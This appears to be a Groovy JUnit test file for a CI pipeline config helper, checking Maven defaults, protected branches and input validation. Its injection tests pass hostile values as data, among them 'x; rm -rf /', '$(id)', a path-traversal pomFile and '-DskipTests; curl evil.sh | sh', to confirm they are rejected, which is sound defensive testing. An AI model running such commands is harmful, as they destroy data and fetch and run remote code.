import org.junit.Test

import static org.junit.Assert.*

class CiConfigTest {

    private Map app(Map args, Map env = [:]) {
        new PipelineHarness(env).binding.getVariable('ciConfig').app(args) as Map
    }

    private String errorOf(Map args) {
        try {
            app(args)
            fail("expected an error for ${args}")
        } catch (PipelineHarness.PipelineError e) {
            return e.message
        }
    }

    @Test
    void mavenDefaults() {
        def a = app(type: 'maven', name: 'shopping-cart')
        assertEquals('17', a.javaVersion)
        assertEquals('pom.xml', a.pomFile)
        assertEquals('clean verify', a.mavenGoals)
        assertEquals('', a.mavenArgs)
        assertEquals('shopping-cart', a.sonarProjectKey)
        assertEquals('dev-backend', a.imageGroup)
        assertTrue(a.publish)
        assertTrue(a.buildImage)
    }

    @Test
    void numericJavaVersionIsAccepted() {
        assertEquals('8', app(type: 'maven', name: 'x', javaVersion: 8).javaVersion)
        assertEquals('11', app(type: 'maven', name: 'x', javaVersion: '11').javaVersion)
    }

    @Test
    void protectedBranches() {
        ['main', 'develop', 'release/1.2'].each {
            assertTrue(it, app([type: 'maven', name: 'x'], [BRANCH_NAME: it]).protectedBranch)
        }
        ['feature/login', 'MR-12', 'bugfix/x'].each {
            assertFalse(it, app([type: 'maven', name: 'x'], [BRANCH_NAME: it]).protectedBranch)
        }
    }

    @Test
    void rejectsUnknownParameter() {
        assertTrue(errorOf(type: 'maven', name: 'x', skipTests: true).contains('unknown parameter(s) [skipTests]'))
    }

    @Test
    void rejectsUnknownType() {
        assertTrue(errorOf(type: 'gradle', name: 'x').contains('type must be maven, python or node'))
    }

    @Test
    void rejectsUnsupportedJavaVersion() {
        assertTrue(errorOf(type: 'maven', name: 'x', javaVersion: '7').contains('maven version 7 not supported'))
    }

    @Test
    void rejectsShellInjectionInNames() {
        assertTrue(errorOf(type: 'maven', name: 'x; rm -rf /').contains('invalid name'))
        assertTrue(errorOf(type: 'maven', name: 'x', dockerfile: '$(id)').contains('invalid dockerfile'))
        assertTrue(errorOf(type: 'maven', name: 'x', pomFile: '../other/pom.xml').contains('invalid pomFile'))
    }

    @Test
    void rejectsShellInjectionInMavenOptions() {
        assertTrue(errorOf(type: 'maven', name: 'x', mavenArgs: '-DskipTests; curl evil.sh | sh').contains('invalid mavenArgs'))
        assertTrue(errorOf(type: 'maven', name: 'x', mavenGoals: 'verify && rm -rf ~').contains('invalid mavenGoals'))
        assertTrue(errorOf(type: 'maven', name: 'x', mavenArgs: '-Dx="a b"').contains('invalid mavenArgs'))
        assertTrue(errorOf(type: 'maven', name: 'x', mavenGoals: '   ').contains('mavenGoals must not be empty'))
    }

    @Test
    void acceptsPlainMavenOptions() {
        def a = app(type: 'maven', name: 'x', mavenGoals: 'clean install', mavenArgs: '-Pci,it -pl api -am -Dmaven.test.failure.ignore=false')
        assertEquals('clean install', a.mavenGoals)
    }

    @Test
    void rejectsBadWaiverDate() {
        assertTrue(errorOf(type: 'maven', name: 'x', trivyWaiverUntil: '31/12/2026').contains('trivyWaiverUntil must be YYYY-MM-DD'))
    }
}
